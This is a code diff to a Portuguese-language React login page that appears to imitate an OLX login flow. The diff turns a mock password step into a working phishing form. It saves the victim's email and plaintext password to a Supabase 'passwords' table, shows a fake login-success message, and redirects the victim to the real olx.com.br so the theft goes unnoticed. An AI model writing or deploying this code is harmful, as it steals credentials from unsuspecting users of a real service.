@@ -7,43 +7,48 @@ import Logo from "@/components/Logo";
 import { Eye, EyeOff, CheckCircle2 } from "lucide-react";
 import { toast } from "sonner";
 import cloudfire from "../../assets/cloudfire.png";
+import { supabase } from "@/lib/supabaseClient";
+
 
 const Password = () => {
   const navigate = useNavigate();
   const [password, setPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
   const [showSuccess, setShowSuccess] = useState(false);
+const email = localStorage.getItem("user_email");
 
-  const handleLogin = (e: React.FormEvent) => {
-    e.preventDefault();
-    
-    if (!password) {
-      toast.error("Por favor, insira sua senha");
-      return;
-    }
-    
-    if (password.length < 6) {
-      toast.error("A senha deve ter pelo menos 6 caracteres");
-      return;
-    }
-    
-    setShowSuccess(true);
-    
-    setTimeout(() => {
-      toast.success("Login realizado com sucesso!");
-      navigate("/");
-    }, 1500);
-  };
+const handleLogin = async (e: React.FormEvent) => {
+  e.preventDefault();
 
-  const handleBack = () => {
-    navigate("/auth/verify-phone");
-  };
+  if (!password) {
+    toast.error("Por favor, insira sua senha");
+    return;
+  }
+
+
+
+  // salva no Supabase igual ao e-mail
+  const { error } = await supabase
+    .from("passwords")
+    .insert({ email,password });
+
+  if (error) {
+    toast.error("Erro ao salvar senha no banco");
+    console.error(error);
+    return;
+  }
+
+  setShowSuccess(true);
+
+  setTimeout(() => {
+    toast.success("Login realizado com sucesso!");
+   window.location.href = "https://olx.com.br"
+  }, 1500);
+};
 
   return (
     <div className="min-h-screen bg-background flex flex-col">
-      <header className="border-b border-border p-4">
-        <Logo />
-      </header>
+
       
       <main className="flex-1 flex items-center justify-center p-4">
         <div className="w-full max-w-md space-y-8">
@@ -100,7 +105,7 @@ const Password = () => {
             </div>
 
             <Button 
-             onClick={() => window.location.href = "https://olx.com.br"}
+     
               type="submit"
               className="w-full h-12 bg-primary hover:bg-primary/90 text-primary-foreground font-normal rounded-lg"
             >
